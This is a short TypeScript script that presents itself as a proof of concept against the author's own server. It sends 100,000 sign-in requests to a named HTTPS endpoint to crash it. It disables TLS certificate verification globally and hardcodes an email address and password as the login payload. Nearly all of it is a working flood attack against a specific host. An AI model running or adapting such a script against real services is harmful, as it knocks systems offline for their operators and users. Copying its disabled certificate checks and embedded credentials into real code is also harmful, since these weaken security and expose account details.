/*
 * Proof of concept of the bug that I discovered in my own code, using bun and typescript as the basic language, a valid user will crash the
 * server, espcially by using concurrent requests from diffrent machines */
export {};
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const AUTH_URL: string = "https://sgrn.com/sgrn/api/auth/signin";

type SigninPayload = {
    email: string;
    password: string;
};

async function postNTimes(t_url: string, t_payload: SigninPayload, t_n: number): Promise<void> {
    for (let i = 1; i <= t_n; i++) {
        try {
            const res = await fetch(t_url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(t_payload),
            });

            const text = await res.text();

            console.log(`--- Request ${i} ---`);
            console.log("Status:", res.status);
            console.log("Response:", text);
        } catch (err) {
            console.error(`--- Request ${i} failed ---`);
            console.error(err);
        }
    }
}

// Proof of concept usage
const payload: SigninPayload = {
    email: "ibrahimowins@gmail.com",
    password: "12345678",
};

await postNTimes(
    AUTH_URL,
    payload,
    100000, // n times
);
